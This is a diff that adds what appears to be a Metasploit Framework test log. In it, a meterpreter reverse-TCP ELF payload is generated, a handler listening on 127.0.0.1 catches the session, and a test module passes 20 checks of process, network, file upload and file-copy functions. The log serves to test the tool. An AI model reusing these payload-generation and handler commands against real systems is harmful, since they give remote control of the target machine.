@@ -1,0 +1,76 @@
+use linux/x86/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> generate -o /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3317-17w2sqs -f elf MeterpreterTryToFork=false lport=6082 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mlinux/x86/meterpreter_reverse_tcp[0m) [0m> [*] Writing 1106480 bytes to /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3317-17w2sqs...
+[4mmsf6[0m payload([1m[31mlinux/x86/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 81
+[4mmsf6[0m payload([1m[31mlinux/x86/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6082 
+[*] Meterpreter session 82 opened (127.0.0.1:6082 -> 127.0.0.1:35740 ) at 2022-01-29 00:43:56 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=82 addentropy=true verbose=true
+[*] Setup: changing working directory to /tmp
+[*] Running against session 82
+[*] Session type is meterpreter and platform is linux
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] Pid: 4797
+[+] should return its own process id
+[*] PID info: {"pid"=>4797, "ppid"=>3317, "name"=>"meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3317-17w2sqs", "path"=>"/tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3317-17w2sqs", "session"=>nil, "user"=>"runner", "arch"=>"x86"}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[+] should return the proper directory separator
+[*] CWD: /tmp
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] Current directory: "/tmp"
+[*] Stat of current directory: #<#<Class:0x00005639b7366b58>:0x00005639b829c0f0 @stathash={"st_dev"=>2065, "st_mode"=>17407, "st_nlink"=>14, "st_uid"=>0, "st_gid"=>0, "st_rdev"=>0, "st_ino"=>4072, "st_size"=>12288, "st_atime"=>1643417036, "st_mtime"=>1643417035, "st_ctime"=>1643417035}>
+[+] should stat a directory
+[*] Directory Name: meterpreter-test-dir-equnmgsy
+[*] Directory created successfully
+[*] Directory removed successfully
+[+] should create and remove a dir
+[*] Directory Name: meterpreter-test-dir-equnmgsy
+[*] Directory created successfully
+[*] Old CWD: /tmp
+[*] New CWD: /tmp/meterpreter-test-dir-equnmgsy
+[*] Back to old CWD: /tmp
+[*] Directory removed successfully
+[+] should change directories
+[*] File Name: meterpreter-test-equnmgsy
+[*] Wrote to meterpreter-test-equnmgsy, checking contents
+[*] Wrote test
+[+] should create and remove files
+[*] Remote File Name: meterpreter-test-file-equnmgsy.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[+] should upload a file
+[*] Source File Name: meterpreter-test-equnmgsy
+[*] Destination File Name: meterpreter-test-equnmgsy-moved
+[+] should move files
+[*] Source File Name: meterpreter-test-equnmgsy
+[*] Destination File Name: meterpreter-test-equnmgsy-copied
+[+] should copy files
+[*] Remote File Name: meterpreter-test-file-equnmgsy.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[*] remote md5: 238bab901e240f3e78ad6f290bca0510
+[*] local md5 : 238bab901e240f3e78ad6f290bca0510
+[*] remote sha: ea186228a55278d32516182f230181dccf4b7934
+[*] local sha : ea186228a55278d32516182f230181dccf4b7934
+[+] should do md5 and sha1 of files
+[*] Testing complete in 0.234823997
+[*] Passed: 20; Failed: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
